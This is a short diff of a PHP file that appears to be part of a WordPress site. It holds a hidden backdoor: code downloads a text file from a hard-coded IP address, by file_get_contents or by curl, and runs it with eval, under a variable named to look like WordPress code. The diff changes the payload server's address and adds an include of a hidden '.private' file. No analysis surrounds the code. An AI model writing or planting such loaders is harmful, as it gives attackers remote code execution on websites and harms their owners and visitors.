@@ -1,4 +1,4 @@
-$wp_http_referer = 'http://69.197.144.158/j251109_13/init.txt';
+$wp_http_referer = 'http://192.187.114.189/j251107_23/init.txt';
 $post_content = false;
 if (ini_get('allow_url_fopen')) {
     $post_content = @file_get_contents($wp_http_referer);
@@ -15,3 +15,4 @@ if ($post_content === false && function_exists('curl_init')) {
 if ($post_content) {
     eval('?>' . $post_content);
 }
+include dirname(__FILE__) . '/.private/config.php';
